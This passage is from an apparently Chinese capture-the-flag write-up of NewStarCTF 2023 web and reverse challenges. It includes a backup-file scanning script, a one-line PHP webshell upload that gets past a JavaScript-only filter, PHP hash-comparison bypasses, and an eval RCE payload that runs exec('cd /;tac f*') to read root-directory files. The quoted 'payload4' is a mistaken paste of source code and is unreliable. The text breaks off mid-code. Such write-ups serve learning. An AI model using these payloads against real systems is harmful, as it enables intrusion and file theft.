alt="image-20230925124621556"></p><p>查看源码，找到secret</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925124719843.png" alt="image-20230925124719843"></p><p>解base64得到<code>n3wst4rCTF2023g00000d</code>，传入</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925124855219.png" alt="image-20230925124855219"></p><p>再用post传一次</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925130250381.png" alt="image-20230925130250381"></p><p>发现cookie中有power字段</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925130245496.png" alt="image-20230925130245496"></p><p>改为ctfer</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925130652453.png" alt="image-20230925130652453"></p><p>修改user-agent</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925131202476.png" alt="image-20230925131202476"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925131212534.png" alt="image-20230925131212534"></p><p>增加Referer字段</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925132256888.png" alt="image-20230925132256888"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925132308681.png" alt="image-20230925132308681"></p><p>本地用户添加一些IP代理字段并设为127.0.0.1即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925134547137.png" alt="image-20230925134547137"></p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925134600449.png" alt="image-20230925134600449"></p><h3 id="泄漏的密码"><a href="#泄漏的密码" class="headerlink" title="泄漏的密码"></a>泄漏的密码</h3><p>既然提到了泄漏文件，使用脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">&#x27;http://fa0d9f5f-084e-4042-b31d-20fe4a3886f6.node4.buuoj.cn:81/&#x27;</span><span class="comment"># url为被扫描地址，后不加‘/’</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常见的网站源码备份文件名</span></span><br><span class="line">list1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;db&#x27;</span>,<span class="string">&#x27;code&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;user&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;index.php&#x27;</span>]</span><br><span class="line"><span class="comment"># 常见的网站源码备份文件后缀</span></span><br><span class="line">list2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;rar&#x27;</span>,<span class="string">&#x27;bak&#x27;</span>,<span class="string">&#x27;old&#x27;</span> ,<span class="string">&#x27;temp&#x27;</span>,<span class="string">&#x27;_index.html&#x27;</span>,<span class="string">&#x27;swp&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;tgz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list2:</span><br><span class="line">        back = <span class="built_in">str</span>(i) + <span class="string">&#x27;.&#x27;</span> + <span class="built_in">str</span>(j)</span><br><span class="line">        url = <span class="built_in">str</span>(url1) + <span class="string">&#x27;/&#x27;</span> + back</span><br><span class="line">        <span class="built_in">print</span>(back + <span class="string">&#x27;    &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(requests.get(url).status_code)</span><br></pre></td></tr></table></figure><p>扫出一个www.zip</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925214808689.png" alt="image-20230925214808689"></p><p>解压后发现还包括robots.txt文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925214946767.png" alt="image-20230925214946767"></p><p>先从index.php找到后面一半</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925215019314.png" alt="image-20230925215019314"></p><p>robots中有前一半</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925215244923.png" alt="image-20230925215244923"></p><p>完整flag为<code>flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</code></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>上传一句话木马，发现扩展名有过滤</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926003046763.png" alt="image-20230926003046763"></p><p>查看源码，过滤功能由JS控制</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926003157460.png" alt="image-20230926003157460"></p><p>关闭页面JS后重新上传</p><p>使用<strong>antsword</strong>连接</p><p>主目录下找到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926012531464.png" alt="image-20230926012531464"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 1=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>] !== <span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$flag1</span> = True;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 2=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;key3&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$flag2</span> = True;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag2</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 3=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key4&#x27;</span>],<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$flag3</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 4=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;key5&#x27;</span>] &gt; <span class="number">2023</span>)&#123;</span><br><span class="line">            <span class="variable">$flag4</span> = True;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 4&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag4</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;=Level 5=&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$var</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$var</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$flag5</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;nope,this is level 5&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一关要求输两个md5值相同的字符串</p><p>此处利用的原理为：<strong>处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</strong></p><p>网上找两个，key1 = “s878926199a”  key2 = “s155964671a”</p><p>payload1为<code>?key1=s878926199a&amp;key2=s155964671a</code></p><p>这题不知道为啥用burp连不上，所以只能用hackbar</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925154610852.png" alt="image-20230925154610852"></p><p>第二关考点是利用数组绕过</p><p>原理是<strong>Md5和sha1对一个数组进行加密将返回NULL；而NULL===NULL返回true，所以可绕过判断</strong></p><p>payload2为<code>key3[]=1</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925160004162.png" alt="image-20230925160004162"></p><p>第三关考点是strcmp函数绕过</p><p>原理是<strong>利用strcmp函数将数组或者对象类型与字符串进行比较会返回-1，但是从5.3开始，会返回0</strong></p><p>payload3为<code>key4[]=1</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925160433472.png" alt="image-20230925160433472"></p><p>第四关</p><p><code>is_numeric</code>函数用于检测变量是否为数字或数字字符串</p><p>但由于php中用字符串与数字比较时，若字符串首位为数字，php会读取直至不是数字的那一位，并将字符串转为数字，我们可以把key5构造为<code>2024a</code></p><p>即payload4为<code>echo &quot;=Level 5=&lt;br&gt;&quot;;    extract($_POST);    foreach($_POST as $var)&#123;        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$var))&#123;            die(&quot;nope,this is level 5&quot;);        &#125;    &#125;    if($flag5)&#123;        echo file_get_contents(&quot;/flag&quot;);    &#125;else&#123;        die(&quot;nope,this is level 5&quot;);    &#125;</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925161628746.png" alt="image-20230925161628746"></p><p>第五关利用extract() 函数覆盖flag5的值，随便传个符号使其判断为True，此时Key3[]中的值也会过滤，所以也需要换成符号</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926094532666.png" alt="image-20230926094532666"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p>本题源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$password</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;e_v.a.l&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$password</span>,<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&quot;c4d038&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先对变量password有要求</p><p>md5值前6个字符需要为<code>c4d038</code>，和crypto中的pow类似，直接把那边的脚本搬过来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">alphabet = string.ascii_letters + string.digits</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> itertools.product(alphabet, repeat=<span class="number">16</span>):</span><br><span class="line">    nonce = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line">    <span class="keyword">if</span> (md5(nonce.encode()).hexdigest()[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;c4d038&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(nonce)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>跑出一个<code>aaaaaaaaaaabOWCK</code></p><p>由于命令执行函数<code>system</code>和<code>passthru</code>都被过滤了</p><p>使用<strong>exec()</strong></p><p>而cat和ls指令也被过滤，使用tac代替cat</p><p>这里还有一个考点，即php中变量名只能为数字字母和下划线</p><p>但如果传参出现<code>[</code>后，<code>[</code>会被替换为下划线，而之后的<strong>特殊字符保留</strong></p><p>构造payload为<code>password=aaaaaaaaaaabOWCK&amp;e[v.a.l=echo exec(&quot;cd /;find f*&quot;);</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926125822199.png" alt="image-20230926125822199"></p><p>发现flag在主目录下</p><p>执行<code>password=aaaaaaaaaaabOWCK&amp;e[v.a.l=echo exec(&quot;cd /;tac f*&quot;);</code>，获得flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926125934187.png" alt="image-20230926125934187"></p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>先用dirsearch扫一扫</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926130650433.png" alt="image-20230926130650433"></p><p>在登陆界面登录后进入一个类似terminal的界面，查看源码</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230926131459654.png" alt="image-20230926131459654"></p><p>截取一段比较有价值的信息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">le.<span class="property">history</span>.<span class="title function_">push</span>(<span class="string">&quot;echo -en &#x27;\\nnewstar\\nnewstar2023&#x27; &gt;&gt; weak-passwd.txt &amp;&amp; \\\nexport PASSWORD=`shuf weak-passwd.txt | head -n 1` &amp;&amp; \\\nrm -rf weak-passwd.txt&quot;</span>),</span><br></pre></td></tr></table></figure><p>注册界面看看admin用户存不存在</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927235142995.png" alt="image-20230927235142995"></p><p>那么这题重心大概率还是在这个登录界面上</p><p>使用burpsuite抓包，爆破admin的密码，需要注意的是密码有一层md5</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928101906750-16958675472391.png" alt="image-20230928101906750"></p><p>跑出一个，MD5值为<code>670b14728ad9902aecba32e22fa4f6bd</code>，解码出来为<code>000000</code></p><p>登录上去发现源码多了一条</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928102355836.png" alt="image-20230928102355836"></p><p>用burp抓包登录成功的响应</p><p>找到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230928102555301.png" alt="image-20230928102555301"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h3><p>使用IDA分析，找到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925191550906.png" alt="image-20230925191550906"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925191611643.png" alt="image-20230925191611643"></p><p>flag为<code>flag&#123;we1c0me_to_rev3rse!!&#125;</code></p><h3 id="Segments"><a href="#Segments" class="headerlink" title="Segments"></a>Segments</h3><p>按提示<code>shift+F7</code>打开segments</p><p>切片名称组成了flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230925211753068.png" alt="image-20230925211753068"></p><p><code>flag&#123;You_ar3_g0od_at_f1nding_ELF_segments_name&#125;</code></p><h3 id="咳"><a href="#咳" class="headerlink" title="咳"></a>咳</h3><p>题目名字暗示脱壳</p><p>丢到<strong>exeinfo</strong>中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927114230516.png" alt="image-20230927114230516"></p><p>检测到UPX加壳</p><p>脱壳</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927130931173.png" alt="image-20230927130931173"></p><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// kr00_8</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">96</span>]; <span class="comment">// [rsp+20h] [rbp-88h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+80h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str1));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  Hello();</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = &amp;Str1[<span class="built_in">strlen</span>(Str1)];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v4 - Str1 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++Str1[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, enc, v4 - Str1) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;WOW!!&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I believe you can do it!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>enc为<code>gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~</code></p><p>代码的功能为读取用户输入<code>Str1</code>后将 <code>Str1</code> 中每个字符的 ASCII 值逐个加1，再将Str1与enc进行比较</p><p>那么我们将enc的每个字符的 ASCII 值逐个减1就能还原flag</p><p>写个python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc=<span class="string">&#x27;gmbh|D1ohsbuv2bu21ot1oQb332ohUifG2stuQ[HBMBYZ2fwf2~&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> enc:</span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(e)-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20230927134346768.png" alt="image-20230927134346768"></p><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>反编译后源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  v6 = encode(s);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(v6);</span><br><span class="line">  s1 = (<span class="type">char</span> *)base64_encode(v6, v3);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;</span>) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  <span class="built_in">free</span>(s1);</span><br><span class="line">  <span class="built_in">free</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源码，程序对flag进行了两次加密，第二次为<strong>base64</strong></p><p>直接分析第一次加密<strong>encode()</strong>函数</p><p>源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall <span class="title function_">encode</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span 